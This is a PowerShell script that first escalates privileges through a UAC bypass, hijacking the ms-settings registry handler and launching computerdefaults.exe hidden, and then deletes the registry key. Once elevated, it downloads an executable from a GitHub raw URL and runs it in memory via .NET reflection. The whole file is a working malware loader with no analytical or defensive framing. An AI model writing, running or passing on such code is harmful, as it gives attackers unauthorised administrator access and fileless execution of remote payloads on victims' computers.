# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # UAC bypass via computerdefaults
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c powershell -File `"$PSCommandPath`""
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value ""
    Start-Process "computerdefaults.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item -Path $regPath -Recurse -Force
    exit
}

# Download and run EXE in memory
$url = "https://github.com/clickmaggot-bit/my-repository/raw/refs/heads/main/dummy.exe"
$bytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint
$entry.Invoke($null, @())